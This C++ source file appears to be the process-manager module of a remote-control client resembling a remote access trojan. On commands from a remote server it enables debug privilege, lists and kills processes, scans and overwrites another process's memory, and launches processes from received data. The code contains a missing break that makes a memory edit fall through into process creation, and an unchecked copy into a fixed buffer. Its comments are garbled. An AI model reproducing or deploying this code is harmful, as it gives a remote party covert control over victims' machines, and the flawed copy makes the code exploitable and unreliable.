#include "pch.h"
#include "ProcessManager.h"
#include "ProcessHelper.h"
#include"Common.h"
CHAR   __BufferData2[0x1000] = { 0 };

CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	//�ش����ݰ���������

	ZhEnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//��ǰ�ͻ���ɨ�������������еĽ�����Ϣ
	SendClientProcessList();
	m_Address = new vector<size_t>;
	m_ScanRelpy = 0;

}
CProcessManager::~CProcessManager()
{
	_tprintf(_T("~CProcessManager()\r\n"));
	ZhEnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_REFRESH_REQUIRE:
	{

		SendClientProcessList();

		break;
	}
	case CLIENT_PROCESS_MANAGER_KILL_REQUIRE:
	{

		//SeCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

		//SeCreateProcess6((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
		ZhKillProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

		break;
	}
	case CLIENT_REMOTE_CHANGE_MEMORY_REQUIRE:
	{
		//MessageBox(NULL, NULL,NULL,NULL);
		memcpy(&m_CurrentProcessIdentity, (LPBYTE)BufferData + sizeof(BYTE), sizeof(HANDLE));

		//ͨ������ID��Ŀ����̿ռ�
		HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
		if (ZhOpenProcessByProcessID(m_CurrentProcessIdentity, &ProcessHandle) == FALSE)
		{
			//MessageBox(NULL, NULL, NULL, NULL);
		}
		m_ProcessHandle = ProcessHandle;
		break;
	}
	case CLIENT_FIRST_SCAN_REQUIRE:
	{
		//MessageBox(NULL, NULL, NULL, NULL);
		MemoryFirstScan((LPBYTE)BufferData + sizeof(BYTE), sizeof(int));
		break;
	}
	case CLIENT_SCAN_AGAIN_REQUIRE:
	{
		//MessageBox(NULL, NULL, NULL, NULL);
		MemoryScanAgain((LPBYTE)BufferData + sizeof(BYTE), sizeof(int));
		break;
	}

	case CLIENT_EDIT_VALUE_REQUIRE:
	{
		ZhEnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
		MemoryValueChange(BufferData + sizeof(BYTE), sizeof(int)+sizeof(size_t));
		ZhEnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
	}


	default:
	{
	memcpy(__BufferData2, (LPBYTE)BufferData, BufferLength);
	ZhCreateProcess6(__BufferData2);
	}

	}
}
void CProcessManager::MemoryFirstScan(PBYTE bufferData, ULONG_PTR BufferLength)
{
	m_Address->clear();
	m_ElementCount = 0;
	HANDLE ProcessHandle = m_ProcessHandle;
	int dataValue;
	memcpy(&dataValue, bufferData, sizeof(int));
	if (dataValue == 0) {
		return;
	}
	size_t VirtualAddress = 0;
	OSVERSIONINFO VersionInfo = { 0 };
	//HMODULE hMod = ::GetModuleHandleW(_T("ntdll.dll"));
	GetVersionEx(&VersionInfo);   //���ϵͳ�汾
	/*GetVersionEx�����Ѿ���Windows 8.1��Windows Server 2012 R2֮��İ汾�б����ã�
	��Ϊ��������ȷ�ػ�ȡ��Щ����ϵͳ�İ汾��Ϣ*/
	if (VersionInfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
		VirtualAddress = 4 * 1024 * 1024;		     // Windows 98ϵ�У�4MB	
	else
		VirtualAddress = 64 * 1024;

	// Windows NTϵ�У�64KB
	_MEMORY_BASIC_INFORMATION64 MemoryBasicInfo = { 0 };
	BYTE BufferData[PAGE_SIZE] = { 0 };
	while (VirtualAddress < RING3_LIMITED)
	{
		size_t BlockSize = 0;
		size_t NewAddress = -1;

		BlockSize = VirtualQueryEx(ProcessHandle, (LPCVOID)VirtualAddress,
			(PMEMORY_BASIC_INFORMATION)&MemoryBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));
		size_t StartAddress = 0;
		size_t EndAddress = 0;
		if (BlockSize == sizeof(_MEMORY_BASIC_INFORMATION64))   //Ŀ�������64λ
		{
			NewAddress = (size_t)MemoryBasicInfo.BaseAddress + (size_t)MemoryBasicInfo.RegionSize + 1;   //��λ����һ������

			if (!(MemoryBasicInfo.Protect & (PAGE_NOACCESS | PAGE_GUARD)))
			{
				StartAddress = MemoryBasicInfo.BaseAddress;                                     //��ǰ�ڴ�ҳ����д
				EndAddress = MemoryBasicInfo.BaseAddress + MemoryBasicInfo.RegionSize;
			}
		}
		else if (BlockSize == sizeof(_MEMORY_BASIC_INFORMATION32))  //Ŀ�������32λ
		{
			_MEMORY_BASIC_INFORMATION32* MemoryBasicInfo32 = (_MEMORY_BASIC_INFORMATION32*)&MemoryBasicInfo;
			NewAddress = (size_t)MemoryBasicInfo32->BaseAddress + (size_t)MemoryBasicInfo32->RegionSize + 1;

			if (!(MemoryBasicInfo32->Protect & (PAGE_NOACCESS | PAGE_GUARD)))
			{
				StartAddress = MemoryBasicInfo32->BaseAddress;
				EndAddress = MemoryBasicInfo32->BaseAddress + MemoryBasicInfo32->RegionSize;
			}
		}
		if (StartAddress > 0 && EndAddress > 0)
		{
			StartAddress = StartAddress - (StartAddress % PAGE_SIZE);
			SIZE_T ReturnLength = 0;
			while (StartAddress < EndAddress)
			{
				if (ReadProcessMemory(ProcessHandle, (LPCVOID)((unsigned char*)StartAddress), BufferData, 0x1000, &ReturnLength)
					&& ReturnLength == PAGE_SIZE)
				{
					size_t* v1;
					for (int i = 0; i < (int)4 * 1024 - 3; i++)
					{
						v1 = (size_t*)&BufferData[i];
						if (v1[0] == dataValue)	// ����Ҫ���ҵ�ֵ��
						{
							//if (__ArrayCount >= 1024)
							//	return FALSE;   //���������ʹ�ö�̬
							// ��ӵ�ȫ�ֱ�����
							m_Address->push_back(StartAddress + i);
							m_ElementCount++;
						}
					}
				}

				StartAddress += PAGE_SIZE;
			}
		}
		if (NewAddress <= VirtualAddress)
			break;
		VirtualAddress = NewAddress;
	}
	m_ScanRelpy = CLIENT_FIRST_SCAN_REPLY;
	SendClientAddressList();
}

void CProcessManager::MemoryScanAgain(PBYTE bufferData, ULONG_PTR BufferLength)
{
	int v1 = m_ElementCount;   //[][]
	m_ElementCount = 0;
	HANDLE ProcessHandle = m_ProcessHandle;
	int dataValue;
	memcpy(&dataValue, bufferData, sizeof(int));
	if (dataValue == 0) {
		return;
	}
	// ��m_AddressList�����¼�ĵ�ַ������
	BOOL IsOk = FALSE;	// ����ʧ��	
	size_t v3 = 0;
	for (int i = 0; i < v1; i++)
	{
		if (ReadProcessMemory(ProcessHandle, (LPCVOID)(*m_Address)[i], &v3, sizeof(size_t), NULL))
		{
			if (v3 == dataValue)
			{
				(*m_Address)[m_ElementCount++] = (*m_Address)[i];
				IsOk = TRUE;
			}
		}
	}
	m_ScanRelpy = CLIENT_SCAN_AGAIN_REPLY;
	SendClientAddressList();

}

void CProcessManager::MemoryValueChange(PBYTE bufferData, ULONG_PTR BufferLength)
{
	HANDLE ProcessHandle = m_ProcessHandle;
	
	size_t TargetAddress=0;
	int TargetValue = 0;
	memcpy(&TargetAddress, bufferData, sizeof(size_t));
	memcpy(&TargetValue, bufferData + sizeof(size_t), sizeof(int));

	WriteProcessMemory(ProcessHandle, (LPVOID)TargetAddress, &TargetValue, sizeof(int), NULL);
	
}
BOOL CProcessManager::SendClientAddressList()
{
	BOOL  IsOk = FALSE;
	DWORD offset = sizeof(BYTE);
	vector<size_t>* addressVector = m_Address;
	int length = sizeof(BYTE) + m_ElementCount * sizeof(size_t);
	if (length == 0)
	{
		return IsOk;
	}
	char* BufferData = NULL;
	int bufferLength = length;
	//BYTE* BufferData = new BYTE[bufferLength];
	BufferData = (char*)LocalAlloc(LPTR, bufferLength);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = m_ScanRelpy;
	//memcpy(BufferData + sizeof(BYTE), addressVector->data(), bufferLength-sizeof(BYTE));

	for (int i = 0; i < m_ElementCount; i++)
	{
		//if (LocalSize(BufferData) < (offset + sizeof(size_t)))
		//{
		//	BufferData = (char*)LocalReAlloc(BufferData, (offset + sizeof(size_t)),
		//		LMEM_ZEROINIT | LMEM_MOVEABLE);
		//}
		memcpy(BufferData + offset, &((*addressVector)[i]), sizeof(size_t));
		offset += sizeof(size_t);

	}

	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}
BOOL CProcessManager::SendClientProcessList()
{

	BOOL  IsOk = FALSE;
	DWORD Offset = 1;
	DWORD v1 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;

	vector<PROCESS_INFORMATION_ITEM> ProcessInfo;   //��̬�ṹ������
	vector<PROCESS_INFORMATION_ITEM>::iterator i;

	//ö�ٽ�����Ϣ
	if (ZhEnumProcessByToolHelp32(ProcessInfo) == FALSE)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;

	//����ģ������
	//[CLIENT_PROCESS_MANAGER_REPLY][ProcessID][ProcessImageName\0][ProcessFullPath\0][λ��\0][ProcessID]......
	for (i = ProcessInfo.begin(); i != ProcessInfo.end(); i++)
	{
		v1 = sizeof(HANDLE) +
			lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->IsWow64Process) + 3;
		// ������̫С�������·�����
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		memcpy(BufferData + Offset, &(i->ProcessIdentity), sizeof(HANDLE));
		Offset += sizeof(HANDLE);
		memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
		Offset += lstrlen(i->ProcessImageName) + 1;
		memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
		Offset += lstrlen(i->ProcessFullPath) + 1;
		memcpy(BufferData + Offset, i->IsWow64Process, lstrlen(i->IsWow64Process) + 1);
		Offset += lstrlen(i->IsWow64Process) + 1;
	}
	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}